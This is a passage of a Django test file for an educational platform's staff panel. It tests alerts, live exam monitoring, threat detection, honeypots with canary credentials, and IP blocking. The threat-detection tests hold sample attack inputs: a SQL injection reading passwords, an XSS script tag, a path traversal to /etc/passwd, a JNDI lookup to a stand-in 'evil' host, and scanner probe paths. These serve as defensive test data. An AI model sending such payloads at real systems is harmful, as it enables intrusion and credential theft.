        skills = {k['label']: k for k in self._page().context['skills']}
        self.assertTrue(skills['Writing']['weak'])
        self.assertNotIn('Speaking', skills)

    def test_activity_is_newest_first_and_short(self):
        events = self._page().context['activity']
        self.assertLessEqual(len(events), 6)
        self.assertEqual([e['when'] for e in events], sorted((e['when'] for e in events), reverse=True))

    def test_user_with_nothing_yet_still_opens(self):
        fresh = User.objects.create_user('yangi', password='pw')
        page = self._page(fresh)
        self.assertEqual(page.status_code, 200)
        self.assertIsNone(page.context['last_result'])
        self.assertEqual([e['kind'] for e in page.context['activity']], ['joined'])

    def test_a_failed_payment_is_not_shown_as_income(self):
        self.assertContains(self._page(), 'text-decoration:line-through')

    def test_no_delete_on_own_profile(self):
        self.assertNotContains(self._page(self.boss), 'deleteUser(%d)' % self.boss.pk)


class LiveExamPageTests(TestCase):
    def setUp(self):
        import json
        from django.core.cache import cache
        from exams.models import Exam, ExamAttempt
        from users.models import StudyGroup
        cache.clear()
        self.json = json
        self.Attempt = ExamAttempt
        self.boss = User.objects.create_superuser('boss', password='pw')
        self.ali = User.objects.create_user('ali', password='pw', first_name='Ali')
        self.vali = User.objects.create_user('vali', password='pw', first_name='Vali')
        exam = Exam.objects.create(title='Mock 1')
        self.a1 = ExamAttempt.objects.create(user=self.ali, exam=exam, client_id='a1', leave_count=4, time_left=600)
        self.a2 = ExamAttempt.objects.create(user=self.vali, exam=exam, client_id='a2')
        self.group = StudyGroup.objects.create(name='Ertalabki')
        self.group.members.add(self.ali)
        self.client.force_login(self.boss)
        self.url = reverse('panel:attempts_live')

    def test_suspicious_tab_lists_only_flagged_attempts(self):
        page = self.client.get(self.url + '?tab=suspicious')
        self.assertEqual(page.context['counts']['suspicious'], 1)
        self.assertEqual([a.pk for a in page.context['attempts']], [self.a1.pk])

    def test_pasted_text_also_counts_as_suspicious(self):
        self.Attempt.objects.filter(pk=self.a2.pk).update(pasted_chars=100)
        self.assertEqual(self.client.get(self.url).context['counts']['suspicious'], 2)

    def test_countdown_starts_from_the_time_left(self):
        rows = {a.pk: a for a in self.client.get(self.url).context['attempts']}
        self.assertLessEqual(rows[self.a1.pk].seconds_left, 600)
        self.assertGreater(rows[self.a1.pk].seconds_left, 590)

    def test_bad_filters_do_not_break_the_page(self):
        page = self.client.get(self.url + '?exam=abc&group=xyz')
        self.assertEqual(page.status_code, 200)
        self.assertEqual((page.context['exam_id'], page.context['group_id']), ('', ''))

    def _command(self, **body):
        return self.client.post(reverse('panel:attempts_command'), data=self.json.dumps(body),
                                content_type='application/json').json()

    def test_message_to_everyone_respects_the_group_filter(self):
        self.assertEqual(self._command(all_active=True, group=self.group.pk, type='message', text='Salom')['sent'], 1)
        self.a2.refresh_from_db()
        self.assertFalse(self.a2.commands)

    def test_message_to_everyone_without_a_filter_reaches_all(self):
        self.assertEqual(self._command(all_active=True, type='message', text='Salom')['sent'], 2)

    def test_page_has_no_browser_prompts(self):
        self.assertNotContains(self.client.get(self.url), 'prompt(')


class StaffAlertTests(TestCase):
    def setUp(self):
        from django.core.cache import cache
        from core.alerts import record_alert
        from core.models import StaffAlert
        cache.clear()
        self.StaffAlert = StaffAlert
        self.record = record_alert
        self.boss = User.objects.create_superuser('boss', password='pw')
        self.other = User.objects.create_user('xodim', password='pw', is_staff=True)
        self.ali = User.objects.create_user('ali', password='pw', first_name='Ali', phone_number='+998901112233')
        self.client.force_login(self.boss)

    def _alert(self, kind='signup', **fields):
        self.record(kind, fields.pop('title', 'Yangi talaba: Ali'), **fields)
        return self.StaffAlert.objects.first()

    def test_page_lists_alerts_and_filters_by_tab(self):
        self._alert('payment', title="To'lov keldi")
        self._alert('signup', title='Talaba keldi')
        page = self.client.get(reverse('panel:alerts'), {'tab': 'payment'})
        self.assertContains(page, 'To&#x27;lov keldi')
        self.assertNotContains(page, 'Talaba keldi')

    def test_search_finds_the_phone(self):
        self._alert(body='+998901112233')
        self._alert(title='Boshqa', body='+998907777777')
        self.assertEqual(len(self.client.get(reverse('panel:alerts'), {'q': '901112233'}).context['alerts']), 1)

    def test_each_staff_member_reads_separately(self):
        alert = self._alert()
        self.client.post(reverse('panel:alert_read', args=[alert.pk]))
        self.assertEqual(self.StaffAlert.unread_for(self.boss).count(), 0)
        self.assertEqual(self.StaffAlert.unread_for(self.other).count(), 1)

    def test_opening_marks_read_and_goes_to_the_target(self):
        alert = self._alert(url='/panel/users/')
        resp = self.client.get(reverse('panel:alert_open', args=[alert.pk]))
        self.assertRedirects(resp, '/panel/users/', fetch_redirect_response=False)
        self.assertEqual(self.StaffAlert.unread_for(self.boss).count(), 0)

    def test_read_all_can_stay_within_a_tab(self):
        self._alert('payment')
        self._alert('signup')
        self.client.post(reverse('panel:alerts_read_all'), {'tab': 'payment'})
        self.assertEqual(list(self.StaffAlert.unread_for(self.boss).values_list('kind', flat=True)), ['signup'])

    def test_read_all_never_redirects_off_the_page(self):
        resp = self.client.post(reverse('panel:alerts_read_all'), {'back': 'https://evil.example/'})
        self.assertEqual(resp.url, reverse('panel:alerts'))

    def test_logins_are_listed_but_not_counted(self):
        self._alert('login', title='Kirish: Ali')
        self.assertEqual(self.client.get(reverse('panel:alerts_poll')).json()['unread'], 0)
        self.assertContains(self.client.get(reverse('panel:alerts')), 'Kirish: Ali')

    def test_poll_returns_count_and_latest(self):
        self._alert()
        data = self.client.get(reverse('panel:alerts_poll')).json()
        self.assertEqual(data['unread'], 1)
        self.assertEqual(data['alerts'][0]['title'], 'Yangi talaba: Ali')

    def test_deleting_an_account_deletes_its_alerts(self):
        self._alert(user=self.ali, body='+998901112233')
        self.ali.delete()
        self.assertFalse(self.StaffAlert.objects.exists())

    def test_a_broken_alert_never_reaches_the_caller(self):
        from unittest.mock import patch
        from django.db import DatabaseError
        with patch.object(self.StaffAlert.objects, 'create', side_effect=DatabaseError):
            self.record('signup', 'x')

    def test_students_cannot_reach_it(self):
        self._alert()
        self.client.force_login(self.ali)
        self.assertEqual(self.client.get(reverse('panel:alerts')).status_code, 302)
        self.assertEqual(self.client.get(reverse('panel:alerts_poll')).status_code, 302)

    def test_web_signup_is_recorded(self):
        self.client.logout()
        self.client.post(reverse('register'), {'first_name': 'Vali', 'last_name': 'Aliyev',
                                               'phone_number': '+998 90 412 09 77', 'password': 'Xk9#mQ2vL7pz'})
        alert = self.StaffAlert.objects.get(kind='signup')
        self.assertIn('Vali Aliyev', alert.title)
        self.assertIn('+998904120977', alert.body)

    def test_student_login_is_quiet(self):
        self.client.logout()
        self.client.post(reverse('login'), {'username': 'ali', 'password': 'pw'})
        self.assertEqual(self.StaffAlert.objects.get().kind, 'login')

    def test_staff_login_from_a_new_device_is_a_security_alert(self):
        from core.alerts import record_login
        from users.models import LoginLog
        chrome = 'Mozilla/5.0 (X11; Linux x86_64) Chrome/156.0 Safari/537.36'
        LoginLog.objects.create(user=self.boss, username_attempt='boss', ip='1.1.1.1', user_agent=chrome, status='success')
        record_login(self.boss, '1.1.1.1', chrome.replace('156', '157'))
        self.assertEqual(self.StaffAlert.objects.first().kind, 'login')  # a browser update is not a new device
        record_login(self.boss, '2.2.2.2', 'Mozilla/5.0 (Windows NT 10.0) Firefox/140.0')
        alert = self.StaffAlert.objects.first()
        self.assertEqual(alert.kind, 'security')
        self.assertIn('Firefox 140 · Windows', alert.body)

    def test_support_message_is_recorded_once_per_waiting_chat(self):
        from chat import services
        from chat.models import ChatMessage
        thread = services.support_of(self.ali)
        before = self.StaffAlert.objects.filter(kind='support').count()
        for text in ('Salom', 'Yordam kerak'):
            services.after_support_message(thread, ChatMessage.objects.create(support=thread, user=self.ali, text=text))
        self.assertEqual(self.StaffAlert.objects.filter(kind='support').count(), before + 1)


class ThreatDetectionTests(TestCase):
    def setUp(self):
        from unittest.mock import patch
        from django.core.cache import cache
        from core import security
        from core.models import SecurityIncident, StaffAlert
        cache.clear()
        security._writes.clear()
        security._flood.update(minute=0, hits=__import__('collections').Counter())
        patcher = patch.object(security, 'WRITE_EVERY', 0)
        patcher.start()
        self.addCleanup(patcher.stop)
        self.security = security
        self.Incident = SecurityIncident
        self.Alert = StaffAlert
        self.boss = User.objects.create_superuser('boss', password='Very-Strong-77')
        self.ali = User.objects.create_user('ali', password='Very-Strong-77', first_name='Ali')

    def _kinds(self):
        return set(self.Incident.objects.values_list('kind', flat=True))

    def test_scanners_are_caught(self):
        for path in ('/.env', '/wp-login.php', '/.git/config', '/phpmyadmin/index.php', '/shell.php', '/backup.sql'):
            self.client.get(path)
        self.assertEqual(self._kinds(), {'scan'})
        self.assertEqual(self.Incident.objects.get().hits, 6)

    def test_gathered_hits_keep_their_samples(self):
        from unittest.mock import patch
        with patch.object(self.security, 'WRITE_EVERY', 3600):
            self.client.get('/.env')  # opens the incident
            self.client.get('/wp-login.php')
            self.client.get('/.git/config')
        with patch.object(self.security, 'WRITE_EVERY', 0):
            self.client.get('/xmlrpc.php')
        incident = self.Incident.objects.get()
        self.assertEqual(incident.hits, 4)
        self.assertEqual(incident.samples, ['/.env', '/wp-login.php', '/.git/config', '/xmlrpc.php'])

    def test_one_alert_per_incident_not_per_hit(self):
        for _ in range(5):
            self.client.get('/.env')
        self.assertEqual(self.Alert.objects.filter(kind='security').count(), 1)

    def test_injections_are_named(self):
        cases = {'sql_injection': "?id=1' UNION SELECT password FROM users--", 'xss': '?q=<script>alert(1)</script>',
                 'traversal': '?file=../../../../etc/passwd', 'code_exec': '?x=${jndi:ldap://evil/a}'}
        for kind, query in cases.items():
            self.client.get('/privacy/' + query)
            self.assertIn(kind, self._kinds())

    def test_encoded_injection_is_caught(self):
        self.client.get('/privacy/?id=1%2527%2520union%2520select%25201')
        self.assertIn('sql_injection', self._kinds())

    def test_normal_pages_stay_quiet(self):
        self.client.force_login(self.ali)
        for url in ('/', '/privacy/', '/dashboard/?q=select+a+course', '/exams-list/', '/reyting/?tab=or+1'):
            self.client.get(url)
        self.assertEqual(self._kinds(), set())

    def test_essay_text_in_a_post_is_never_read(self):
        self.client.post('/login/', {'username': 'x', 'password': "' union select 1 -- <script>"})
        self.assertNotIn('sql_injection', self._kinds())
        self.assertFalse(any('union' in s for i in self.Incident.objects.all() for s in i.samples))

    def test_staff_search_is_not_an_attack(self):
        self.client.force_login(self.boss)
        self.client.get('/panel/users/?q=union+select')
        self.assertEqual(self._kinds(), set())

    def test_flood_needs_many_anonymous_requests(self):
        from unittest.mock import patch
        with patch.object(self.security, 'FLOOD_LIMIT_ANONYMOUS', 5):
            for _ in range(5):
                self.client.get('/privacy/')
        self.assertIn('flood', self._kinds())

    def test_a_classroom_with_sessions_is_not_a_flood(self):
        from unittest.mock import patch
        self.client.force_login(self.ali)
        with patch.object(self.security, 'FLOOD_LIMIT_ANONYMOUS', 5):
            for _ in range(6):
                self.client.get('/privacy/')
        self.assertEqual(self._kinds(), set())

    def _fail(self, username, ip='9.9.9.9'):
        self.client.post('/login/', {'username': username, 'password': 'wrong'}, REMOTE_ADDR=ip)

    def test_repeated_wrong_password_is_brute_force(self):
        for _ in range(5):
            self._fail('ali')
        self.assertIn('brute_force', self._kinds())

    def test_many_accounts_from_one_ip_is_spraying(self):
        for n in range(8):
            self._fail(f'user{n}')
        self.assertIn('spray', self._kinds())

    def test_one_account_from_many_ips_is_distributed(self):
        for n in range(4):
            self._fail('ali', f'9.9.9.{n + 1}')
        self.assertIn('distributed', self._kinds())

    def test_wrong_passwords_on_an_admin_are_flagged(self):
        for _ in range(3):
            self._fail('boss')
        self.assertEqual(self.Incident.objects.get(kind='staff_target').user, self.boss)

    def test_one_typo_is_not_an_attack(self):
        self._fail('ali')
        self.assertEqual(self._kinds(), set())

    def test_success_after_many_failures_is_a_possible_breach(self):
        for _ in range(3):
            self._fail('boss')
        self.client.post('/login/', {'username': 'boss', 'password': 'Very-Strong-77'}, REMOTE_ADDR='8.8.8.8')
        self.assertEqual(self.Incident.objects.get(kind='breach').user, self.boss)

    def test_forged_form_is_logged_quietly(self):
        from django.test import Client
        Client(enforce_csrf_checks=True).post('/login/', {'username': 'a', 'password': 'b'})
        self.assertIn('csrf', self._kinds())
        self.assertFalse(self.Alert.objects.filter(kind='security').exists())

    def test_wrong_host_is_logged(self):
        from django.test import override_settings
        with override_settings(ALLOWED_HOSTS=['testserver']):
            self.client.get('/privacy/', HTTP_HOST='evil.example')
        self.assertIn('bad_host', self._kinds())

    def test_fake_telegram_webhook_is_caught(self):
        from tgbot import api
        from unittest.mock import patch
        with patch.object(api, 'webhook_secret', return_value='real'):
            self.client.post(reverse('tgbot:webhook'), data='{}', content_type='application/json')
        self.assertIn('webhook', self._kinds())

    def test_student_opening_the_panel_is_noted(self):
        self.client.force_login(self.ali)
        self.client.get('/panel/users/')
        self.assertEqual(self.Incident.objects.get(kind='panel_probe').user, self.ali)

    def test_admin_rights_change_raises_an_alert(self):
        self.client.force_login(self.boss)
        self.client.post(reverse('panel:user_make_staff', args=[self.ali.pk]))
        self.assertTrue(self.Alert.objects.filter(kind='security', title__contains='Admin huquqi').exists())

    def test_security_tab_shows_attack_state_and_detail(self):
        self.client.get('/privacy/?id=1 union select 1')
        self.client.force_login(self.boss)
        page = self.client.get(reverse('panel:alerts'), {'tab': 'security'})
        self.assertEqual(page.context['threats']['state'], 'attack')
        self.assertContains(page, 'SQL injection urinishi')
        incident = self.Incident.objects.get()
        detail = self.client.get(reverse('panel:threat_detail', args=[incident.pk]))
        self.assertContains(detail, 'union select')

    def test_opening_an_incident_reads_its_alert_and_it_is_not_listed_twice(self):
        self.client.get('/.env')
        self.client.force_login(self.boss)
        page = self.client.get(reverse('panel:alerts'), {'tab': 'security'})
        self.assertEqual(len(page.context['alerts']), 0)
        self.client.get(reverse('panel:threat_detail', args=[self.Incident.objects.get().pk]))
        self.assertEqual(self.Alert.unread_for(self.boss).count(), 0)

    def test_page_is_escaped(self):
        self.client.get('/privacy/?q=<script>alert(1)</script>')
        self.client.force_login(self.boss)
        incident = self.Incident.objects.get(kind='xss')
        detail = self.client.get(reverse('panel:threat_detail', args=[incident.pk]))
        self.assertNotContains(detail, '<script>alert(1)</script>')

    def test_calm_state_without_attacks(self):
        self.client.force_login(self.boss)
        self.assertEqual(self.client.get(reverse('panel:alerts'), {'tab': 'security'}).context['threats']['state'], 'calm')

    def test_students_cannot_read_incidents(self):
        self.client.get('/.env')
        self.client.force_login(self.ali)
        self.assertEqual(self.client.get(reverse('panel:threat_detail', args=[self.Incident.objects.first().pk])).status_code, 302)


class HoneypotTests(TestCase):
    def setUp(self):
        from unittest.mock import patch
        from django.core.cache import cache
        from core import honeypot, security
        from core.models import CanaryToken, DecoyAdminPassword, SecurityIncident
        cache.clear()
        security._writes.clear()
        honeypot._known['at'] = 0.0
        patcher = patch.object(security, 'WRITE_EVERY', 0)
        patcher.start()
        self.addCleanup(patcher.stop)
        self.Incident = SecurityIncident
        self.Canary = CanaryToken
        self.login = CanaryToken.objects.get(kind='login').value
        self.key = CanaryToken.objects.get(kind='api_key').value
        self.decoy = DecoyAdminPassword.objects.get()
        self.boss = User.objects.create_superuser('boss', password='Very-Strong-77')
        self.ali = User.objects.create_user('ali', password='Very-Strong-77')

    def _kinds(self):
        return set(self.Incident.objects.values_list('kind', flat=True))

    def test_install_has_its_own_bait_in_admin_passwords(self):
        from django.db import connection
        self.assertIn('admin_passwords', connection.introspection.table_names())
        self.assertEqual((self.decoy.username, self.decoy.api_key), (self.login, self.key))
        self.assertTrue(self.login.startswith('superadmin_backup_'))

    def test_visiting_a_decoy_page_is_noted(self):
        self.assertEqual(self.client.get('/administrator/').status_code, 200)
        self.client.get('/backup/')
        self.assertEqual(self._kinds(), {'honeypot_visit'})

    def test_typing_into_the_decoy_login_is_high_risk_and_keeps_no_password(self):
        page = self.client.post('/administrator/', {'username': 'root', 'password': 'Secret-123'})
        self.assertContains(page, 'Invalid username or password')
        incident = self.Incident.objects.get(kind='honeypot_login')
        self.assertEqual(incident.severity, 'high')
        self.assertIn('login: root', incident.samples[0])
        self.assertFalse(any('Secret-123' in s for s in incident.samples))

    def test_robots_hides_the_decoys_from_honest_crawlers(self):
        body = self.client.get('/robots.txt').content.decode()
        self.assertIn('Disallow: /administrator/', body)
        self.assertIn('Disallow: /backup/', body)

    def test_canary_login_on_the_site_is_caught(self):
        self.client.post('/login/', {'username': self.login, 'password': self.decoy.password})
        self.assertIn('canary', self._kinds())
        self.assertEqual(self.Canary.objects.get(kind='login').hits, 1)

    def test_canary_login_in_the_app_is_caught(self):
        import json
        self.client.post('/api/learn/auth/login/', data=json.dumps({'username': self.login, 'password': 'x'}),
                         content_type='application/json')
        self.assertIn('canary', self._kinds())

    def test_canary_login_on_django_admin_is_caught(self):
        from django.conf import settings
        from django.test import override_settings
        storages = {**settings.STORAGES, 'staticfiles': {'BACKEND': 'django.contrib.staticfiles.storage.StaticFilesStorage'}}
        with override_settings(STORAGES=storages):  # tests run without collectstatic's manifest
            self.client.post('/admin/login/', {'username': self.login, 'password': 'x'})
        self.assertIn('canary', self._kinds())

    def test_canary_password_never_logs_anyone_in(self):
        self.client.post('/login/', {'username': self.login, 'password': self.decoy.password})
        self.assertNotIn('_auth_user_id', self.client.session)

    def test_canary_api_key_is_caught_anywhere(self):
        self.client.get('/api/learn/me/', HTTP_AUTHORIZATION=f'Bearer {self.key}')
        self.client.get('/privacy/', HTTP_X_API_TOKEN=self.key)
        self.assertEqual(self.Incident.objects.get(kind='canary').hits, 2)
        self.assertEqual(self.Canary.objects.get(kind='api_key').hits, 2)

    def test_ordinary_logins_trip_nothing(self):
        self.client.post('/login/', {'username': 'ali', 'password': 'wrong'})
        self.client.post('/login/', {'username': 'ali', 'password': 'Very-Strong-77'})
        self.assertNotIn('canary', self._kinds())

    def test_security_tab_lists_the_bait(self):
        self.client.force_login(self.boss)
        page = self.client.get(reverse('panel:alerts'), {'tab': 'security'})
        self.assertContains(page, self.key)
        self.assertContains(page, '/administrator/')

    def test_students_never_see_the_bait(self):
        self.client.force_login(self.ali)
        self.assertNotContains(self.client.get('/dashboard/'), self.key)


class IpBlockAndCheckTests(TestCase):
    def setUp(self):
        from datetime import timedelta
        from unittest.mock import patch
        from django.core.cache import cache
        from core import blocking, security
        from core.models import AuditLog, BlockedIP
        cache.clear()
        security._writes.clear()
        blocking.forget()
        self.addCleanup(blocking.forget)
        patcher = patch.object(security, 'WRITE_EVERY', 0)
        patcher.start()
        self.addCleanup(patcher.stop)
        self.timedelta = timedelta
        self.Blocked = BlockedIP
        self.Audit = AuditLog
        self.boss = User.objects.create_superuser('boss', password='Very-Strong-77')
        self.helper = User.objects.create_user('yordamchi', password='Very-Strong-77', is_staff=True)
        self.ali = User.objects.create_user('ali', password='Very-Strong-77')

    def _block(self, network='5.5.5.5', **fields):
        from core import blocking
        block = self.Blocked.objects.create(network=network, **fields)
        blocking.forget()
        return block

    def test_blocked_ip_gets_403_and_others_do_not(self):
        block = self._block()
        self.assertEqual(self.client.get('/privacy/', REMOTE_ADDR='5.5.5.5').status_code, 403)
        self.assertEqual(self.client.get('/privacy/', REMOTE_ADDR='6.6.6.6').status_code, 200)
        block.refresh_from_db()
        self.assertEqual(block.hits, 1)

    def test_a_range_blocks_every_address_in_it(self):
        self._block('5.5.5.0/24')
        self.assertEqual(self.client.get('/privacy/', REMOTE_ADDR='5.5.5.200').status_code, 403)

    def test_signed_in_staff_always_pass(self):
        self._block()
        self.client.force_login(self.helper)
        session = self.client.session
        session['staff_location_verified'] = True
        session.save()
        self.assertEqual(self.client.get('/panel/', REMOTE_ADDR='5.5.5.5').status_code, 200)

    def test_blocked_students_cannot_get_in(self):
        self._block()
        self.client.force_login(self.ali)
        self.assertEqual(self.client.get('/dashboard/', REMOTE_ADDR='5.5.5.5').status_code, 403)

    def test_an_expired_block_lets_people_through(self):
        from django.utils import timezone
        self._block(expires_at=timezone.now() - self.timedelta(minutes=1))
        self.assertEqual(self.client.get('/privacy/', REMOTE_ADDR='5.5.5.5').status_code, 200)

    def test_staff_block_from_the_panel_and_it_is_logged(self):
        self.client.force_login(self.helper)
        self.client.post(reverse('panel:ip_block'), {'network': '5.5.5.5', 'duration': '1h', 'reason': 'Skaner'})
        block = self.Blocked.objects.get()
        from django.utils import timezone
        self.assertLess(block.expires_at - timezone.now(), self.timedelta(hours=1, minutes=1))
        self.assertTrue(self.Audit.objects.filter(action='ip_block', target='5.5.5.5/32').exists())
        self.client.logout()
        self.assertEqual(self.client.get('/privacy/', REMOTE_ADDR='5.5.5.5').status_code, 403)

    def test_forever_has_no_end(self):
        self.client.force_login(self.helper)
        self.client.post(reverse('panel:ip_block'), {'network': '5.5.5.5', 'duration': 'forever'})
        self.assertIsNone(self.Blocked.objects.get().expires_at)

    def test_unblock(self):
        block = self._block()
        self.client.force_login(self.helper)
        self.client.post(reverse('panel:ip_unblock', args=[block.pk]))
        self.client.logout()
        self.assertEqual(self.client.get('/privacy/', REMOTE_ADDR='5.5.5.5').status_code, 200)
        self.assertTrue(self.Audit.objects.filter(action='ip_unblock').exists())

    def test_refuses_blocks_that_would_lock_people_out(self):
        self.client.force_login(self.helper)
        for network in ('127.0.0.1', '5.0.0.0/8', 'not-an-ip', '10.1.2.3'):
            self.client.post(reverse('panel:ip_block'), {'network': network}, REMOTE_ADDR='10.1.2.3')
        self.assertFalse(self.Blocked.objects.exists())

    def test_students_cannot_block(self):
        self.client.force_login(self.ali)
        self.client.post(reverse('panel:ip_block'), {'network': '5.5.5.5'})
        self.assertFalse(self.Blocked.objects.exists())

    def test_incident_page_warns_when_students_share_the_ip(self):
        from core.models import SecurityIncident
        from django.utils import timezone
        from users.models import LoginLog
        LoginLog.objects.create(user=self.ali, username_attempt='ali', ip='5.5.5.5', status='success')
        incident = SecurityIncident.objects.create(kind='scan', ip='5.5.5.5', last_seen=timezone.now())
        self.client.force_login(self.helper)
        page = self.client.get(reverse('panel:threat_detail', args=[incident.pk]))
        self.assertContains(page, "1 ta hisob kirgan")
        self.assertContains(page, 'Bu IP ni bloklash')
        self.assertNotContains(page, 'Blokdan chiqarish')

    def test_incident_page_shows_an_existing_block(self):
        from core.models import SecurityIncident
        from django.utils import timezone
        self._block()
        incident = SecurityIncident.objects.create(kind='scan', ip='5.5.5.5', last_seen=timezone.now())
        self.client.force_login(self.helper)
        self.assertContains(self.client.get(reverse('panel:threat_detail', args=[incident.pk])), 'Blokdan chiqarish')

    def test_telegram_webhook_is_never_blocked(self):
        self._block('5.5.5.5')
        status = self.client.post('/tg/webhook/', data='{}', content_type='application/json',
                                  REMOTE_ADDR='5.5.5.5').status_code
        self.assertNotIn(b'Kirish vaqtincha cheklangan', self.client.post('/tg/webhook/', data='{}',
                         content_type='application/json', REMOTE_ADDR='5.5.5.5').content)
        self.assertIn(status, (200, 403))  # the webhook's own secret check still applies

    def test_permissions_policy_header(self):
        header = self.client.get('/privacy/', secure=True)['Permissions-Policy']
        self.assertIn('camera=(self)', header)
        self.assertIn('geolocation=(self)', header)

    def test_staff_panel_requires_location(self):
        self.client.force_login(self.helper)
        session = self.client.session
        del session['staff_location_verified']  # set for every test login by the test runner
        session.save()
        response = self.client.get('/panel/', secure=True)
        self.assertRedirects(response, '/panel/location-required/?next=/panel/', fetch_redirect_response=False)

    def test_staff_location_is_saved_on_latest_login(self):
        from users.models import LoginLog
        self.client.force_login(self.helper)
        LoginLog.objects.create(user=self.helper, username_attempt='yordamchi', ip='5.5.5.5', status='success')
        response = self.client.post(
            reverse('panel:location_required'),
            {'latitude': 41.2995, 'longitude': 69.2401, 'accuracy': 12.5},
            content_type='application/json', secure=True,
        )
        self.assertEqual(response.status_code, 200)
        login = LoginLog.objects.get(user=self.helper)
        self.assertEqual(login.latitude, 41.2995)
        self.assertEqual(login.longitude, 69.2401)
        self.assertEqual(login.location_accuracy, 12.5)
        self.assertIsNotNone(login.location_captured_at)

    def test_invalid_staff_location_is_rejected(self):
        self.client.force_login(self.helper)
        response = self.client.post(
            reverse('panel:location_required'),
            {'latitude': 91, 'longitude': 69.2401, 'accuracy': 12.5},
            content_type='application/json', secure=True,
        )
        self.assertEqual(response.status_code, 400)

    def test_checklist_is_for_superusers_only(self):
        self.client.force_login(self.helper)
        self.assertEqual(self.client.get(reverse('panel:security_check')).status_code, 302)
        self.client.force_login(self.boss)
        page = self.client.get(reverse('panel:security_check'))
        self.assertEqual(page.status_code, 200)
        self.assertIn('score', page.context['check'])

    def test_checklist_flags_a_guessable_admin_login(self):
        User.objects.create_user('admin', password='Very-Strong-77', is_staff=True)
        self.client.force_login(self.boss)
        items = {i['title']: i for i in self.client.get(reverse('panel:security_check')).context['check']['items']}
        self.assertEqual(items['Admin loginlari taxmin qilinmaydi']['status'], 'warn')
        self.assertIn('admin', items['Admin loginlari taxmin qilinmaydi']['detail'])

    def test_checklist_flags_a_used_canary(self):
        from core.models import CanaryToken
        CanaryToken.objects.filter(kind='login').update(hits=1)
        self.client.force_login(self.boss)
        items = {i['title']: i for i in self.client.get(reverse('panel:security_check')).context['check']['items']}
        self.assertEqual(items['Canary tokenlar tegilmagan']['status'], 'bad')

